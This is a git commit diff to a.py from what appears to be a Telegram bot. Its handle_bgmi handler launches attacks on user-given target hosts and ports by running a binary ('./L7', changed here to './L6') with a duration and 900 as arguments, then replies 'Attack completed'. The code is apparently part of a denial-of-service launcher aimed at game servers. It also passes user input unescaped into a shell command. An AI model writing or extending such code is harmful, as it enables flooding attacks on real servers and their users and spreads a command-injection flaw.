abb48efcab61f177c75208df308ebcca70b105cf
tintin400819 <tintin.400819@gmail.com>
2025-02-23 17:39:21 +0530

    Update a.py

--- a.py
+++ a.py
@@ -237,7 +237,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./L7 {target} {port} {time} 900"
+                full_command = f"./L6 {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
                 response = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
         else:
